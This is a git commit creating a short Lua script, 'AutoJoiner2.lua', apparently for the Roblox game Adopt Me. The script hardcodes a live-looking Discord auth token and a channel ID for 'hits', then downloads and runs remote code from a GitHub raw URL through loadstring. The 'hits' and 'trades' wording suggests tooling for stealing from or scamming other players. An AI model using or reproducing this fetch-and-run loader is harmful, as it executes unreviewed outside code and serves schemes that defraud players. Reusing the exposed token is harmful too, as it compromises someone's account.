974e13122fc6501772d4a73f8efd1d0dd4a2433c
Medinololboi <Mohammaddarwish557@gmail.com>
2025-03-31 13:27:17 +0100

    Create AutoJoiner2.lua

---
+++ AutoJoiner2.lua
@@ -0,0 +1,5 @@
+token = "MTI5OTYxMDU4OTEzOTgzMjgzMg.GRGyrY.VxARPiLiFsBCPi437dnLqmn3SvaiZ-EdHPkVy8" -- Discord Token here (DISCORD AUTH TOKEN) TUTORIAL: https://www.youtube.com/watch?v=LnBnm_tZlyU
+channelId = "1356185000495812749" -- Channel ID that your hits are in. TUTORIAL: https://www.youtube.com/watch?v=YjiQ7CajAgg
+delay = 0.1 -- How many seconds it will wait to chat after loading is done. If you have problems with not getting trades, try making delay higher (I dont recommend higher than 5)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Adopt-Me/refs/heads/main/autojoin.lua'))()
